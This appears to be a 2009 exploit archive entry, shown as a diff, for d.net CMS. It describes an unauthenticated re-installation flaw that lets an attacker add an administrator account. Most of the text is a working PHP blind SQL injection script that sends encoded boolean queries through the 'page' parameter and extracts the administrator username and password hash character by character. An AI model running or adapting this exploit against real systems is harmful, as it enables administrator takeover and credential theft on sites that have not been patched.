@@ -1,0 +1,83 @@
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+-           __           __     _       __                -
++      ____/ /___ ______/ /__  (_)___  / /_____  _____    +
+-     / __  / __ `/ ___/ //_/ / / __ \/ //_/ _ \/ ___/    -
++    / /_/ / /_/ / /  / ,<   / / /_/ / ,< /  __/ /        +
+-    \__,_/\__,_/_/  /_/|_|_/ /\____/_/|_|\___/_/         -
++                        /___/                            +
+-                                                         -
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+[+] Arbitrary Re-Installation Vulnerability
+
+There's no check about the elimination of 'help' directory, 
+then whenever an administrator forget to delete it, we can
+re-install the CMS, it means we can add a new administrator
+account, without specify database's informations.
+
+http://hostname/dnetCMS/help/install.php
+
+
+
+[+] Blind SQL Injection Exploit
+
+<?php
+
+function usage () {
+	exit (	"\n".
+		"[+] d.net CMS Blind SQL Injection Exploit\n".
+		"[+] Author  : darkjoker\n".
+		"[+] Site    : http://darkjoker.net23.net\n".
+		"[+] Download: https://sourceforge.net/projects/dnet/\n".
+		"[+] Usage   : php xpl.php <hostname> <path>\n".
+		"[+] Ex.     : php xpl.php localhost /dnetCMS/\n".
+		"[+] Greetz  : cristina, puccio (they kept me company when I coded this stuff :D)\n".
+		"\n");
+}
+
+function hex ($string) {
+	$i=0;
+	while ($i<strlen($string)) 
+		$hex .= "%".dechex(ord($string[$i++]));
+	return $hex;
+}
+
+function check ($hostname, $path, $character, $position, $field) {
+	$character = ord($character);
+	$sp = fsockopen ($hostname, 80);
+	$query = hex ("'x' OR ASCII(SUBSTRING((SELECT {$field} FROM cms_security_master WHERE id=1),{$position},1))={$character} -- ");
+	$request = "GET {$path}index.php?page={$query} HTTP/1.1\r\n".
+		   "Host: {$hostname}\r\n".
+		   "Connection: Close\r\n\r\n";
+	fputs ($sp, $request);
+	while (!feof ($sp)) 
+		$reply .= fgets ($sp,1024);
+	fclose ($sp);
+	if ((preg_match ("|Location: index\.php|", $reply)) || (preg_match ("|<b>Cannot modify</b>:|", $reply)))
+		return false;
+	else
+		return true;
+}
+
+function get_field ($hostname, $path, $field) {
+	echo "[+] ".ucfirst($field)." (hash): ";
+	$chars = "abcdef0123456789";
+	for($i=0,$d=1;$d<=32;$i++) {
+		if (check ($hostname, $path, $chars [$i], $d, $field)) {
+			echo $chars [$i];
+			$i = -1;
+			$d++;
+		}
+	}
+	echo "\n";
+}
+
+if ($argc != 3)
+	usage ();
+$hostname = $argv [1];
+$path = $argv [2];
+$fields = array ("username", "password");
+foreach ($fields as $field)
+	get_field ($hostname, $path, $field);
+
+# milw0rm.com [2009-07-11]
